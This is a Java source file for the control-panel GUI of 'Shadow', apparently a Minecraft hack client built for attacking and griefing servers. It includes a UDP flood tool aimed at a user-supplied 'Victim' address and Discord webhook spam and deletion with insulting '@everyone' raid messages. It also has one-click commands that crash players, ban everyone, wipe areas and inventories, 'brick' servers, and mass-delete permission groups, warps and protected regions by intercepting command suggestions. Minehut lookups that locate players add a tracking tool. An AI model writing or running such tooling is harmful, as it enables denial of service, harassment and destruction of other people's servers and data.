package net.shadow.gui;

import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonParser;
import com.mojang.brigadier.suggestion.Suggestion;
import com.mojang.brigadier.suggestion.Suggestions;
import imgui.ImGui;
import imgui.flag.ImGuiInputTextFlags;
import imgui.flag.ImGuiWindowFlags;
import imgui.type.ImInt;
import imgui.type.ImString;
import it.unimi.dsi.fastutil.floats.FloatArrayList;
import it.unimi.dsi.fastutil.floats.FloatList;
import net.minecraft.client.network.PlayerListEntry;
import net.minecraft.entity.Entity;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import net.minecraft.network.packet.s2c.play.CommandSuggestionsS2CPacket;
import net.minecraft.network.packet.s2c.play.GameMessageS2CPacket;
import net.minecraft.network.packet.s2c.play.OpenWrittenBookS2CPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.Identifier;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.registry.Registry;
import net.shadow.Shadow;
import net.shadow.font.FontRenderers;
import net.shadow.event.events.PacketInput;
import net.shadow.feature.CommandRegistry;
import net.shadow.feature.base.Command;
import java.util.List;
import net.shadow.gui.DiscordWebhook.EmbedObject;
import net.shadow.mixin.IdentifierAccessor;
import net.shadow.plugin.DosHandler;
import net.shadow.plugin.FriendSystem;
import net.shadow.plugin.Notification;
import net.shadow.plugin.NotificationSystem;
import net.shadow.utils.ChatUtils;
import net.shadow.utils.CreativeUtils;
import net.shadow.utils.PlayerUtils;
import net.shadow.utils.Utils;

import javax.security.auth.login.LoginException;
import java.awt.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URI;
import java.net.URL;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Random;

public class ShadowScreenIMGUI extends ProxyScreen implements PacketInput {
    static final FloatList packIn = new FloatArrayList();
    static final FloatList packOut = new FloatArrayList();
    static final List<String> logs = new ArrayList<>();
    static final HttpClient hclient = HttpClient.newBuilder()
            .version(HttpClient.Version.HTTP_1_1)
            .followRedirects(HttpClient.Redirect.NORMAL)
            .connectTimeout(Duration.ofSeconds(20))
            .build();
    static boolean alt = false;
    static int blocked = 0;
    static String packetinputmode = "none";
    private static int[] plru = null;
    private static String plrname = "none";
    final ImString minehut = new ImString("test.minehut.gg", 100);
    final ImString token = new ImString("BOT TOKEN", 128);
    final ImString spmsg = new ImString("@everyone raided", 128);
    final ImString wh = new ImString("https://discord.com/api/", 300);
    final ImString mesg = new ImString("@everyone raided", 300);
    final ImString uname = new ImString("Shadow client", 300);
    final ImString ipg = new ImString("127.0.0.1:80", 300);
    final ImString iurl = new ImString("", 300);
    final int[] amount = new int[1];
    final int[] whrepeat = new int[1];
    final int[] packets = new int[1];
    final ImString currentc = new ImString();
    ImString url = new ImString("", 300);
    ImString jsonpayloads = new ImString("", 1000);
    ImString jndiip = new ImString("127.0.0.1", 25);
    ImString jndipayload = new ImString("Exploit", 100);
    ImString httpresult = new ImString("Waiting...");
    PlayerListEntry current = null;
    boolean issmooth = true;
    boolean particles = true;
    String currentFriend = null;
    PlayerListEntry currentPlayer = null;
    ImInt aa = new ImInt(0);
    int frames = 0;

    public static void addtoConsole(String args) {
        logs.add(args);
    }

    private static String loadString(String uri) {
        try {
            URL url = new URL(uri);

            BufferedReader items = new BufferedReader(
                    new InputStreamReader(url.openStream()));
            StringBuilder returnr = new StringBuilder();
            for (String line : items.lines().toArray(String[]::new)) {
                returnr.append(line);
            }
            return returnr.toString();

        } catch (Exception e) {
            e.printStackTrace();
            return "";
        }
    }

    private static void hangLoad(String uri) {
        try {
            URL url = new URL(uri);
            var none = url.openStream();
        } catch (Exception ignored) {

        }
    }


    private static int toInt(byte[] bytes) {
        int ret = 0;
        for (int i = 0; i < 4; i++) {
            ret <<= 8;
            ret |= (int) bytes[i] & 0xFF;
        }
        return ret;
    }

    protected void renderInternal() {
        try {
            friends();
            dos();
            ionettytimerontop();
            griefGUI();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    protected void startWindow() {
        ImGui.setWindowSize(500, 500);
    }

    private void minehut() {
        ImGui.setNextWindowSizeConstraints(400, 175, 400, 175);
        ImGui.begin("Minehut", ImGuiWindowFlags.NoResize);
        ImGui.inputText("Name", minehut);
        if (ImGui.button("Plugins", 150F, 30F)) {
            new Thread(() -> {
                try {
                    NotificationSystem.notifications.add(new Notification("Plugins", "Grabbing Server Info", 50));
                    String serverdata = loadString("https://api.minehut.com/server/" + minehut.get().replace(".minehut.gg", "") + "?byName=true");
                    NotificationSystem.notifications.add(new Notification("Plugins", "Grabbing Menu Items", 150));
                    String menuitems = loadString("https://merchandise-service-prod.superleague.com/merchandise/v1/merchandise/products/?populateVersions=true");
                    NotificationSystem.notifications.add(new Notification("Plugins", "Sorting and matching...", 50));
                    JsonArray serverplugs = new JsonParser().parse(serverdata).getAsJsonObject().get("server").getAsJsonObject().get("installed_content").getAsJsonArray();
                    JsonArray menuplugs = new JsonParser().parse(menuitems).getAsJsonObject().get("products").getAsJsonArray();
                    List<String> server = new ArrayList<>();
                    for (JsonElement plugin : serverplugs) {
                        String serverpluginid = plugin.getAsJsonObject().get("content_id").getAsString();
                        for (JsonElement menuitem : menuplugs) {
                            String menuitemname = menuitem.getAsJsonObject().get("sku").getAsString();
                            if (menuitemname.equalsIgnoreCase(serverpluginid)) {
                                server.add(menuitem.getAsJsonObject().get("title").getAsString());
                            }
                        }
                    }
                    NotificationSystem.notifications.add(new Notification("Plugins", "Done", 50));
                    StringBuilder complist = new StringBuilder();
                    for (String item : server) {
                        complist.append(item).append(", ");
                    }
                    complist = new StringBuilder(complist.substring(0, complist.length() - 2));
                    ChatUtils.message("Server Plugins [" + server.size() + "] : " + complist);
                } catch (Exception e) {
                    e.printStackTrace();
                    NotificationSystem.notifications.add(new Notification("Plugins", "Something went wrong while grabbing plugins", 50));
                }
            }).start();
        }
        ImGui.sameLine();
        if (ImGui.button("ForceFind", 150F, 30F)) {
            new Thread(() -> {
                try {
                    String finalplayer = "NONE";
                    String serverg = loadString("https://api.minehut.com/servers/");
                    String playeruuid = new JsonParser().parse(loadString("https://api.mojang.com/users/profiles/minecraft/" + minehut.get())).getAsJsonObject().get("id").getAsString();
                    JsonArray servers = new JsonParser().parse(serverg).getAsJsonObject().get("servers").getAsJsonArray();
                    for (JsonElement server : servers) {
                        JsonArray players = server.getAsJsonObject().get("playerData").getAsJsonObject().get("players").getAsJsonArray();
                        for (JsonElement player : players) {
                            if (player.getAsString().replace("-", "").equals(playeruuid)) {
                                finalplayer = server.getAsJsonObject().get("name").getAsString();
                            }
                        }
                    }
                    ChatUtils.message(minehut.get() + " Was found on " + finalplayer);
                } catch (Exception e) {
                    ChatUtils.message("Error While Finding player");
                }
            }).start();
        }
        if (ImGui.button("Players", 150F, 30F)) {
            new Thread(() -> {
                try {
                    List<String> names = new ArrayList<>();
                    ChatUtils.message("[MinehutHack] Grabbing Servers");
                    String serverg = loadString("https://api.minehut.com/servers");
                    JsonArray servers = new JsonParser().parse(serverg).getAsJsonObject().get("servers").getAsJsonArray();
                    ChatUtils.message("[MinehutHack] Parsing Data");
                    for (JsonElement server : servers) {
                        if (server.getAsJsonObject().get("name").getAsString().strip().equalsIgnoreCase(minehut.get().replace(".minehut.gg", "").strip())) {
                            ChatUtils.message("[MinehutHack] Found Server");
                            JsonArray serverplayers = server.getAsJsonObject().get("playerData").getAsJsonObject().get("players").getAsJsonArray();
                            for (JsonElement player : serverplayers) {
                                try {
                                    String uuid = player.getAsString();
                                    String data = loadString("https://api.ashcon.app/mojang/v2/user/" + uuid);
                                    String name = new JsonParser().parse(data).getAsJsonObject().get("username").getAsString();
                                    names.add(name);
                                } catch (Exception ignored) {
                                }
                            }
                        }
                    }
                    ChatUtils.message("[MinehutHack] Finish");
                    ChatUtils.message("[MinehutHack] Players:");
                    for (String name : names) {
                        ChatUtils.message(name);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    ChatUtils.message("[MinehutHack] Something Went Wrong, check the console");
                }
            }).start();
        }
        ImGui.end();
    }

    private void webhooks() {
        ImGui.setNextWindowSizeConstraints(500, 250, 1000, 2000);
        ImGui.begin("Webhooks");
        ImGui.inputText("Webhook Url", wh);
        ImGui.sliderInt("Amount", whrepeat, 1, 20);
        ImGui.inputTextMultiline("Content", mesg);
        ImGui.inputText("Username", uname);
        ImGui.inputText("Image URL", iurl);
        if (ImGui.button("Fire", 150F, 30F)) {
            String[] webhooks = wh.get().split(";");
            new Thread(() -> {
                for (String webhook : webhooks) {
                    try {
                        DiscordWebhook hook = new DiscordWebhook(webhook);
                        hook.setAvatarUrl(iurl.get());
                        hook.setUsername(uname.get());
                        hook.setContent(mesg.get());
                        hook.execute();
                        ChatUtils.message("Sent Payload to webhook " + webhook);
                    } catch (Exception e) {
                        ChatUtils.message("Failed to send payload");
                    }
                }
            }).start();
        }
        ImGui.sameLine();
        if (ImGui.button("Spam", 150F, 30F)) {
            String[] webhooks = wh.get().split(";");
            new Thread(() -> {
                for (int i = 0; i < whrepeat[0]; i++) {
                    for (String webhook : webhooks) {
                        try {
                            DiscordWebhook hook = new DiscordWebhook(webhook);
                            hook.setAvatarUrl(iurl.get());
                            hook.setUsername(uname.get());
                            hook.setContent(mesg.get());
                            hook.execute();
                            ChatUtils.message("Sent Payload to webhook " + webhook);
                        } catch (IOException e) {
                            NotificationSystem.notifications.add(new Notification("Webhooks", "Failed to Send Payload to webhook", 150));
                        }
                    }
                    try {
                        Thread.sleep(250);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }).start();
        }
        if (ImGui.button("Delete", 150F, 30F)) {
            HttpRequest request = HttpRequest.newBuilder()
                    .DELETE()
                    .setHeader("User-Agent", "")
                    .setHeader("Content-Type", "application/json")
                    .uri(URI.create(wh.get())).build();
            try {
                HttpResponse<String> callback = hclient.send(request, HttpResponse.BodyHandlers.ofString());
                if (callback.statusCode() == 200) {
                    NotificationSystem.notifications.add(new Notification("Webhooks", "Deleted Webhook", 150));
                } else {
                    NotificationSystem.notifications.add(new Notification("Webhooks", "Failed to delete webhook", 150));
                }
            } catch (IOException | InterruptedException e) {
                e.printStackTrace();
            }
        }
        ImGui.sameLine();
        if (ImGui.button("EMBSpam", 150F, 30F)) {
            String[] webhooks = wh.get().split(";");
            new Thread(() -> {
                for (int i = 0; i < whrepeat[0]; i++) {
                    for (String webhook : webhooks) {
                        try {
                            EmbedObject embed = new EmbedObject();
                            embed.setAuthor("MONTY", "https://discord.com/invite/moles", "https://cdn.discordapp.com/attachments/918282935533187102/918339438571032627/yes-monty-mole.gif");
                            embed.setFooter("MEMEZ INSTALLED", "https://media.discordapp.net/attachments/703543742002626602/888736015211200562/spongebobdefender.gif");
                            embed.setDescription("MOLED BY MOLES discord.gg/moles ".repeat(5));
                            embed.setImage("https://cdn.discordapp.com/attachments/918282935533187102/918339438571032627/yes-monty-mole.gif");
                            embed.setThumbnail("https://cdn.discordapp.com/attachments/918282935533187102/918339438571032627/yes-monty-mole.gif");
                            embed.setTitle("MONTY MOLED");
                            embed.setUrl("https://discord.gg/moles");
                            embed.setColor(new Color(255, 0, 0, 255));
                            String[] insults = new String[]{"Memed on lol ez", "MOLED", "moles clout", "minehut monkey down", "https://discord.gg/moles", "moles on top", "moles own you", "cope harder", "cope bozo moled by moles", "moles > everyone", "coper", "lmaooo", "cope hard", "seeth and cope", "cope and seethe", "Cry about it", "problem???", "trent issue", "minehut monkey rekt", "RIP BOZO", "rest in PISS you wont be missed", "clown down"};
                            for (int j = 0; j < 25; j++) {
                                embed.addField("MOLE", insults[new Random().nextInt(insults.length)] + "", true);
                            }

                            DiscordWebhook hook = new DiscordWebhook(webhook);
                            hook.setAvatarUrl("https://cdn.discordapp.com/attachments/918197816818536459/918334502961578034/unknown.png");
                            hook.setUsername("MONTY");
                            hook.addEmbed(embed);
                            hook.setContent("@everyone MOLED https://discord.com/invite/moles " + ("MOLED BY MOLES MEMED ON LOL EZ " + insults[new Random().nextInt(insults.length)] + " ").repeat(25));
                            hook.setTts(true);
                            hook.execute();
                            ChatUtils.message("Sent Payload to webhook " + webhook);
                        } catch (IOException e) {
                            NotificationSystem.notifications.add(new Notification("Webhooks", "Failed to Send Payload to webhook", 150));
                            e.printStackTrace();
                        }
                    }
                    try {
                        Thread.sleep(250);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }).start();
        }
        ImGui.end();
    }

    private void dos(){
        ImGui.begin("DoS", ImGuiWindowFlags.NoResize);
        ImGui.setWindowSize(500, 500);
        ImGui.inputText("Victim", ipg);
        ImGui.sliderInt("Power", packets, 10, 9000);
        ImGui.text("Layer 4");
        if(ImGui.button("UDP", -1F, 30F)){
            String[] uwu = ipg.get().split(":");
            String host = uwu[0];
            int port = Integer.parseInt(uwu[1]);
            for(int i = 0; i < packets[0]; i++){
                new Thread(() ->{
                    DosHandler.udp(host, port);
                }).start();
            }
        }
        ImGui.button("TCP", -1F, 30F);
        ImGui.text("Layer 7");
        ImGui.button("HTTP", -1F, 30F);
        ImGui.button("SlowLoris", -1F, 30F);
        ImGui.button("RamFuck", -1F, 30F);
        ImGui.end();
    }

    private void friends() {
        if (Shadow.c.player != null) {
            ImGui.begin("Friends", ImGuiWindowFlags.NoResize);
            ImGui.setWindowSize(600, 450);
            if (ImGui.beginTabBar("Lists")) {
                if (ImGui.beginTabItem("All Players")) {
                    if (ImGui.beginListBox("", 190, -1)) {
                        try {
                            for (PlayerListEntry pl : Shadow.c.getNetworkHandler().getPlayerList()) {
                                if (ImGui.selectable(pl.getProfile().getName(), pl.equals(currentPlayer))) {
                                    currentPlayer = pl;
                                }
                            }
                            ImGui.endListBox();
                        } catch (Exception e) {
                            ImGui.endListBox();
                        }
                    }
                    if (currentPlayer != null) {
                        ImGui.sameLine();
                        ImGui.beginGroup();
                        ImGui.text("Username:" + currentPlayer.getProfile().getName());
                        ImGui.text("Nick: " + (currentPlayer.getDisplayName() == null ? "None" : currentPlayer.getDisplayName().asString()));
                        ImGui.text("UUID: " + currentPlayer.getProfile().getId().toString());
                        ImGui.text("Gamemode: " + (currentPlayer.getGameMode() == null ? "Null" : currentPlayer.getGameMode().getName()));
                        if (FriendSystem.isFriend(currentPlayer.getProfile().getName())) {
                            if (ImGui.button("Remove Friend")) {
                                FriendSystem.friendsystem.remove(currentPlayer.getProfile().getName());
                            }
                        } else {
                            if (ImGui.button("Add Friend")) {
                                FriendSystem.friendsystem.add(currentPlayer.getProfile().getName());
                            }
                        }
                        ImGui.endGroup();
                    }
                    ImGui.endTabItem();
                }
                if (ImGui.beginTabItem("Friends")) {
                    if (ImGui.beginListBox("", 190, -1)) {
                        for (String friend : FriendSystem.friendsystem) {
                            if (ImGui.selectable(friend, friend.equals(currentFriend))) {
                                currentFriend = friend;
                            }
                        }
                        ImGui.endListBox();
                    }
                    if (currentFriend != null) {
                        ImGui.sameLine();
                        ImGui.beginGroup();
                        ImGui.text("Username: " + currentFriend);
                        if (FriendSystem.isFriend(currentFriend)) {
                            if (ImGui.button("Remove Friend")) {
                                FriendSystem.friendsystem.remove(currentFriend);
                            }
                        } else {
                            if (ImGui.button("Re Add Friend")) {
                                FriendSystem.friendsystem.add(currentFriend);
                            }
                        }
                        ImGui.endGroup();
                    }
                    if (ImGui.button("Give Perms", 150F, 30F)) {
                        for (String friend : FriendSystem.getFriends()) {
                            Shadow.c.player.sendChatMessage("/op " + friend);
                        }
                    }
                    ImGui.sameLine();
                    if (ImGui.button("Unban", 150F, 30F)) {
                        for (String friend : FriendSystem.getFriends()) {
                            Shadow.c.player.sendChatMessage("/pardon " + friend);
                        }
                    }
                    ImGui.sameLine();
                    if (ImGui.button("Unban-IP", 150F, 30F)) {
                        for (String friend : FriendSystem.getFriends()) {
                            Shadow.c.player.sendChatMessage("/pardonip " + friend);
                        }
                    }
                    ImGui.endTabItem();
                }
                ImGui.endTabBar();
            }
            ImGui.end();
        }
    }

    private void console() {
        ImGui.setNextWindowSizeConstraints(500, 500, 2000, 500);
        ImGui.begin("Console");
        ImGui.pushItemWidth(-1);
        if (ImGui.beginChild("ScrollRegion##", 0, -(ImGui.getStyle().getItemSpacingY() + ImGui.getFrameHeightWithSpacing()), false)) {
            ImGui.pushTextWrapPos();
            for (String log : new ArrayList<>(logs)) {
                ImGui.textUnformatted(log);
            }
            ImGui.popTextWrapPos();
            if (ImGui.getScrollY() >= ImGui.getScrollMaxY()) ImGui.setScrollHereY(1f);
            ImGui.endChild();
        }

        boolean reclaimFocus = false;
        if (ImGui.inputText("", currentc, ImGuiInputTextFlags.EnterReturnsTrue)) {
            if (currentc.get().length() > 0) {
                logs.add(">" + currentc.get());
                String message = ">" + currentc.get();
                try {
                    String cmd = message.substring(1);
                    String[] args = cmd.split(" ");
                    Command co = CommandRegistry.find(args[0].toLowerCase());
                    if (co == null) {
                        ChatUtils.message("Unknown command");
                    } else {
                        args = Arrays.copyOfRange(args, 1, args.length);
                        co.call(args);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            currentc.set("");
            reclaimFocus = true;
        }


        if (reclaimFocus) ImGui.setKeyboardFocusHere(-1);
        ImGui.popItemWidth();
        ImGui.end();
    }

    public void ionettytimerontop() {
        if (Shadow.c.player != null) {
            frames++;
            if (frames % 20 == 0) {
                packOut.add(Shadow.c.getNetworkHandler().getConnection().getAveragePacketsSent());
                while (packOut.size() > 50) {
                    packOut.removeFloat(0);
                }
            }
            ImGui.begin("Server", ImGuiWindowFlags.NoResize | ImGuiWindowFlags.AlwaysAutoResize);
            float[] pin = packIn.toFloatArray();
            float[] pout = packOut.toFloatArray();
            ImGui.text("Packets out");
            ImGui.plotLines("", pout, pout.length, 0, "", min(pout), max(pout), 0, 100);
            ImGui.separator();
            ImGui.text("Address: " + Shadow.c.getNetworkHandler().getConnection().getAddress().toString());
            ImGui.text("Tab list players: " + Shadow.c.getNetworkHandler().getPlayerList().size());
            ImGui.text("Loaded players: " + Shadow.c.world.getPlayers().size());
            ImGui.end();
        }
    }

    private void griefGUI() {
        ImGui.setNextWindowSizeConstraints(600, 500, 600, 500);
        ImGui.begin("Grief", ImGuiWindowFlags.NoResize);
        if (ImGui.beginTabBar("Lists")) {
            if (ImGui.beginTabItem("Players")) {
                if (ImGui.button("Crash All", -1F, 50F)) {
                    Shadow.c.player.sendChatMessage("/execute as @a at @s run particle flame ~ ~ ~ 1 1 1 0 999999999 force @s");
                }
                if (ImGui.button("Ban All", -1F, 50F)) {
                    Shadow.c.player.sendChatMessage("/ban @a[distance=5..]");
                }
                if (ImGui.button("Clear All", -1F, 50F)) {
                    Shadow.c.player.sendChatMessage("/clear @a");
                }
                if (ImGui.button("Eco All", -1F, 50F)) {
                    Shadow.c.player.sendChatMessage("/eco give ** 1000000");
                }
                if (ImGui.button("Grief All", -1F, 50F)) {
                    Shadow.c.player.sendChatMessage("/execute as @a at @s run fill ~-15 ~-15 ~-15 ~15 ~15 ~15 air");
                }
                ImGui.endTabItem();
            }
            if (ImGui.beginTabItem("Server")) {
                if (ImGui.button("Delete LP Data", -1F, 50F)) {
                    packetinputmode = "lp";
                    Shadow.getEventSystem().add(PacketInput.class, this);
                    Shadow.c.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, "/lp deletegroup "));
                }
                if (ImGui.button("Delete MRL Data", -1F, 50F)) {
                    Shadow.getEventSystem().add(PacketInput.class, this);
                    packetinputmode = "mrl";
                    Shadow.c.player.sendChatMessage("/mrl list");
                }
                if (ImGui.button("Disable Skripts", -1F, 50F)) {
                    Shadow.c.player.sendChatMessage("/sk disable all");
                }
                if (ImGui.button("Delete Shopkeepers", -1F, 50F)) {
                    new Thread(() -> {
                        Shadow.c.player.sendChatMessage("/shopkeeper deleteall admin");
                        Utils.sleep(50);
                        Shadow.c.player.sendChatMessage("/shopkeeper confirm");
                    }).start();
                }
                if (ImGui.button("Spam LP", -1F, 50F)) {
                    for (int i = 0; i < 100; i++) {
                        Shadow.c.player.sendChatMessage("/lp creategroup " + i + new Random().nextInt(10000));
                    }
                }
                if (ImGui.button("Delete Warps", -1F, 50F)) {
                    packetinputmode = "warps";
                    Shadow.getEventSystem().add(PacketInput.class, this);
                    Shadow.c.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, "/delwarp "));
                }
                if (ImGui.button("Delete Regions", -1F, 50F)) {
                    packetinputmode = "worldguard";
                    Shadow.getEventSystem().add(PacketInput.class, this);
                    Shadow.c.player.sendChatMessage("/rg list");
                }
                ImGui.endTabItem();
            }
            if (ImGui.beginTabItem("Data")) {
                if (ImGui.button("Save All", -1F, 50F)) {
                    Shadow.c.player.sendChatMessage("/save-all");
                }
                if (ImGui.button("Turn off AutoSave", -1F, 50F)) {
                    Shadow.c.player.sendChatMessage("/save-off");
                }
                if (ImGui.button("Brick Server", -1F, 50F)) {
                    Shadow.c.player.sendChatMessage("/gamerule randomTickSpeed 299999999");
                }
                ImGui.endTabItem();
            }
            ImGui.endTabBar();
        }
        ImGui.end();
    }

    float min(float[] in) {
        float m = 0;
        for (float v : in) {
            m = Math.min(v, m);
        }
        return m;
    }

    float max(float[] in) {
        float m = 0;
        for (float v : in) {
            m = Math.max(v, m);
        }
        return m;
    }

    boolean send(String message, String uri) throws IOException, InterruptedException {
        HttpRequest request = HttpRequest.newBuilder()
                .POST(HttpRequest.BodyPublishers.ofString("{\"content\": \"" + message + "\"}"))
                .setHeader("User-Agent", "")
                .setHeader("Content-Type", "application/json")
                .uri(URI.create(uri)).build();
        HttpResponse<String> response = hclient.send(request, HttpResponse.BodyHandlers.ofString());
        return response.statusCode() == 204;
    }

    String sendJSON(String json, String uri) throws IOException, InterruptedException {
        HttpRequest request = HttpRequest.newBuilder()
                .POST(HttpRequest.BodyPublishers.ofString(json))
                .setHeader("User-Agent", "")
                .setHeader("Content-Type", "application/json")
                .uri(URI.create(uri)).build();
        HttpResponse<String> response = hclient.send(request, HttpResponse.BodyHandlers.ofString());
        return response.body();
    }

    private String getItemNameFromStack(ItemStack hstack) {
        String hs = hstack.getItem().getTranslationKey();
        hs = hs.replace("minecraft.", "").replace("block.", "").replace("item.", "");
        return hs;
    }

    private BlockPos getPlayerCoords(String name) {
        if (PlayerUtils.getEntity(name) != null) {
            Entity e = PlayerUtils.getEntity(name);
            return e.getBlockPos();
        } else {
            Shadow.getEventSystem().add(PacketInput.class, this);
            alt = false;
            return PlayerUtils.locate(name);
        }
    }

    @Override
    public void onReceivedPacket(PacketInputEvent event) {
        if (event.getPacket() instanceof OpenWrittenBookS2CPacket && !alt) {
            event.cancel();
            Shadow.getEventSystem().remove(PacketInput.class, this);
        }
        if (event.getPacket() instanceof GameMessageS2CPacket && alt) {
            blocked++;
            event.cancel();
            if (blocked > 2) {
                blocked = 0;
                Shadow.getEventSystem().remove(PacketInput.class, this);
                alt = false;
            }
        }
        if (event.getPacket() instanceof GameMessageS2CPacket packet) {
            String message;
            switch (packetinputmode) {
                case "worldguard" -> {
                    message = packet.getMessage().getString();
                    if (message.contains("------------------- Regions -------------------")) {
                        ChatUtils.message("true");
                        message = message.replace("------------------- Regions -------------------", "");
                        message = message.trim();
                        message = message.replace("[Info]", "");
                        message = message.trim();
                        ChatUtils.message(message);
                        String[] arr = message.trim().split(" ");
                        for (String h : arr) {
                            Shadow.c.player.sendChatMessage("/rg delete " + h.strip().replace("\n", "").substring(2, h.length()));
                        }
                        Shadow.getEventSystem().remove(PacketInput.class, this);
                    }
                }
                case "mrl" -> {
                    message = packet.getMessage().getString();
                    if (message.contains(",")) {
                        message = message.replace(",", "");
                        String[] based = message.split(" ");
                        String[] copied = Arrays.copyOfRange(based, 1, based.length);
                        for (String mrl : copied) {
                            Shadow.c.player.sendChatMessage("/mrl erase " + mrl);
                        }
                        Shadow.getEventSystem().remove(PacketInput.class, this);
                    }
                }
            }
        }
        if (event.getPacket() instanceof CommandSuggestionsS2CPacket packet) {
            switch (packetinputmode) {
                case "lp" -> {
                    Suggestions all = packet.getSuggestions();
                    for (Suggestion i : all.getList()) {
                        Shadow.c.player.sendChatMessage("/lp deletegroup " + i.getText());
                    }
                    Shadow.getEventSystem().remove(PacketInput.class, this);
                }
                case "warps" -> {
                    Suggestions alla = packet.getSuggestions();
                    for (Suggestion i : alla.getList()) {
                        Shadow.c.player.sendChatMessage("/delwarp " + i.getText());
                    }
                    Shadow.getEventSystem().remove(PacketInput.class, this);
                }
            }
        }

    }

    private Identifier reflectField(String injectee) {
        Identifier sysinfo = new Identifier("minecraft:code");
        ((IdentifierAccessor) sysinfo).setPath(injectee);
        return sysinfo;
    }
}